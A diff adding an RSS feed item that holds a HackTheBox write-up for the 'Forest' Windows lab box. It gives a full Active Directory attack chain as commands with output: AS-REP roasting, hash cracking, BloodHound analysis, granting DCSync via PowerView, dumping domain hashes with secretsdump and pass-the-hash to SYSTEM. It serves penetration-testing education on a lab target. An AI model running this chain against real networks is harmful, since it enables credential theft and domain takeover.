@@ -12,8 +12,152 @@
     <ttl>1440</ttl>
     <generator>After Dark 9.1.0 (Hugo 0.59.1)</generator>
     <language>en-US</language>
-    <lastBuildDate>Wed, 25 Mar 2020 12:48:58 UT</lastBuildDate>
+    <lastBuildDate>Wed, 25 Mar 2020 14:07:42 UT</lastBuildDate>
     <atom:link href="https://domain.example/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HTB Write-up: Forest</title>
+      <link>https://domain.example/post/forest/</link>
+      <pubDate>Wed, 25 Mar 2020 10:40:00 UT</pubDate>
+      <dc:creator>theyknow</dc:creator>
+      <guid>https://domain.example/post/forest/</guid>
+      <description>The Forest Windows box retired this weekend on HackTheBox. Getting user was quite straight forward but escalating privileges was a little more compricated. We&amp;rsquo;ll have a look at BloodHound for that last step, it&amp;rsquo;s an open source tool that I use a lot for work now and that I can&amp;rsquo;t recommend enough.
+1: Recon First, I do the usual nmap scan I start with on all boxes: nmap -A -T5 10.</description>
+      <category domain="https://domain.example/categories/post">Post</category>
+      <content:encoded><![CDATA[ The Forest Windows box retired this weekend on HackTheBox. Getting user was quite straight forward but escalating privileges was a little more compricated. We&amp;rsquo;ll have a look at BloodHound for that last step, it&amp;rsquo;s an open source tool that I use a lot for work now and that I can&amp;rsquo;t recommend enough.
+1: Recon First, I do the usual nmap scan I start with on all boxes: nmap -A -T5 10.10.10.161 -oN nmap.txt
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-13 10:08 EDT
+Nmap scan report for 10.10.10.161
+Host is up (0.052s latency).
+Not shown: 989 closed ports
+PORT STATE SERVICE VERSION
+53/tcp open domain?
+| fingerprint-strings: | DNSVersionBindReqTCP: | version
+|_ bind
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-13 14:15:52Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=10/13%Time=5DA33001%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03&#34;);
+Aggressive OS guesses: Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2012 or Server 2012 R2 (91%), Microsoft Windows 10 (91%), Microsoft Windows 10 1507 (91%), Microsoft Windows 10 1507 - 1607 (91%), Microsoft Windows 10 1511 (91%), Microsoft Windows Server 2012 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows  Looking at the open ports, we have a very standard windows box using Active Directory and that the domain is called &amp;ldquo;htb.local&amp;rdquo;. If you&amp;rsquo;re starting to learn about Active Directory pen-testing, I highly recommend googling these services such as LDAP, RPC, and Kerberos.
+By design, Active Directory can be asked for a lot of public information without being authenticated, so let&amp;rsquo;s just do that with one of nmap scripts (also possible with Metasploit&amp;rsquo;s smb_enum_users): root@kali:~/# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;htb.local&#39;,userdb=/root/HTB_writeups/HackTheBox/Forest/users.txt 10.10.10.161
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-13 11:24 EDT
+Nmap scan report for 10.10.10.161
+Host is up (0.043s latency).
+PORT STATE SERVICE
+88/tcp open kerberos-sec
+| krb5-enum-users: | Discovered Kerberos principals
+| santi@htb.local
+| qwe@htb.local
+| sebastien@htb.local
+| svc-alfresco@htb.local
+| mark@htb.local
+| andy@htb.local
+|_ lucinda@htb.local
+Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds  Sweet! We got a list of users! One of them pops out from all the others: svc-alfresco. The name &amp;ldquo;svc&amp;rdquo; would mean that it&amp;rsquo;s a service account so we can check if it was misconfigured. There is this cool cheatsheet to learn how to use the widly recommended Impacket. Following the cheatsheet, we check if any of the users are vulnerable to ASREPRoast: root@kali:~/Downloads/impacket-0.9.20/examples# GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile /root/HTB_writeups/HackTheBox/Forest/users.txt
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+[-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:8fc61bd2945c40654201cce35f6702c7$cc2d0b8f0d53a4dcbb1d491773ea7bddd7fc3f30886ce8f59a379c5d8cd012011f1962816d141baa2efe7c83ffbfe08a171fc383dd65228cd0630353acc007f696920879c1e69b1344ff301dc8449176bd87848a73e61298cd7c450f71db1f4da5d90458099482d295f80a81813fd64ac87b02c8441f422612a82c3325b61442aec5f004479c9a23359232ac4c4785282f0e0bdea5e5e22edabc5e90d551362c7704d962db0399a0aa555233a978a07947b0d5c6593dfbdf6a37ca50944e927626a2eaa8447df84033886e8ad2109f3e37104ffaaf39a98ce984cb0c102a870f33d6bb579a4f
+[-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User qwe doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User forest doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set  As we expected, src-alfresco was misconfigured and did not require pre-authentication and we got the account&amp;rsquo;s hash! Time to crack it!
+
+2: Getting a shell Copy the hash to a text file called hash.txt, and run the following with john: root@kali:~/# john --wordlist=/root/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+s3rvice (?)
+1g 0:00:00:03 DONE (2019-10-13 12:36) 0.2557g/s 1044Kp/s 1044Kc/s 1044KC/s s4553592..s3r2s1
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed  Great! It took only 3 seconds, but not surprising with how bad the password was: s3rvice. Now we can get our shell with my favourite evil-winrm and get the user flag:
+
+3: Priviledge Escalation In Active Directory, you can use BloodHound to find relationships (between users, groups and computers) which can be used to escalate your privileges. It is very useful for the red team but also for the blue team in order to identify and mitigate the vulnerabilities and limit the paths to high value targets within your AD architecture.
+After downloading the lastest release of BloodHound, we can use our evil-winrm shell to upload it to the serve, run it there, and download back the results which will be in a zip format.
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents upload ~/Downloads/BloodHound/Ingestors/SharpHound.ps1 .\SharpHound.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Import-Module .\SharpHound.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Invoke-BloodHound -CollectionMethod All -domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents download .\20191031121111_BloodHound.zip /root/Downloads/BloodHound/Ingestors/report.zip
+Info: Downloading .\20191031121111_BloodHound.zip to /root/Downloads/BloodHound/Ingestors/report.zip
+Info: Download successful!  If you&amp;rsquo;ve done the BloodHound set up correctly following their GitHub guide, you should have neo4j (database) running and the bloodhound gui opened. Just dragged and dropped the zip file into the BloodHound gui and it will upload it to the database automatically. When it&amp;rsquo;s finished, select the &amp;ldquo;Shortest path to Domain Admin&amp;rdquo; query and you&amp;rsquo;ll see something like this:
+We&amp;rsquo;re interested in the svc-alresco path, and we see that we&amp;rsquo;re member of a group called &amp;ldquo;Exchange Windows Permission&amp;rdquo; which has WriteDacl right on the entire domain. WriteDacl basically gives this group the ability to create any relationship they want. Bad news for the blue team, great team for us! Even better is that by clicking the WriteDacl relationship in BloodHound, it gives us a step-by-step guide on how to exploit it:
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents upload /root/Downloads/dev_PowerSploit/PowerSploit/Recon/PowerView.ps1 .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents $SecPassword = ConvertTo-SecureString &#39;s3rvice&#39; -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents $Cred = New-Object System.Management.Automation.PSCredential(&#39;htb\svc-alfresco&#39;, $SecPassword)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Add-ADGroupMember -Identity &#34;EXCHANGE WINDOWS PERMISSIONS&#34; -Members &#39;svc-alfresco&#39;
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents Add-DomainObjectAcl -TargetIdentity &#39;DC=htb,DC=local&#39; -Rights DCSync -Verbose -PrincipalIdentity &#39;htb\svc-alfresco&#39; -credential $Cred  Following BloodHound&amp;rsquo;s instructions, we gave ourselves (svc-alfresco) the DCSync right. DCSync is &amp;ldquo;a late-stage kill chain attack that allows an attacker to simulate the behavior of Domain Controller (DC) in order to retrieve password data via domain replication&amp;rdquo; (source: this blog).
+Thanks to this new right we&amp;rsquo;ll be able to imitate the Domain Controller and identify ourselves as anyone else as long as we have their password hash. We don&amp;rsquo;t even need their password! And a Domain Controller, we can now dump all the password hashes, how convenient:
+root@kali:~/Downloads/impacket/examples# python3 secretsdump.py svc-alfresco@10.10.10.161 -dc-ip 10.10.10.161
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+vtx:7601:aad3b435b51404eeaad3b435b51404ee:4fe81be97e299fe1b2d3798af44d5268:::
+maverick:7602:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:cae144f9a15df3a4f011e5f30579b3bc:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Cleaning up...  Here is the Administrator password hash. One last Impacket script and we have a shell as Administrator:
+root@kali:~/Downloads/impacket/examples# python3 psexec.py Administrator@10.10.10.161 -target-ip 10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file hKQHLske.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service lepp on 10.10.10.161.....
+[*] Starting service lepp.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+C:\Windows\system32whoami
+nt authority\system  That was probably my favourite Windows box, and it&amp;rsquo;s definitely not an easy one! I recommend it to anyone interested in Windows pen-testing.
+]]></content:encoded>
+    </item>
     <item>
       <title>HTB Write-up: Bastion</title>
       <link>https://domain.example/post/bastion/</link>
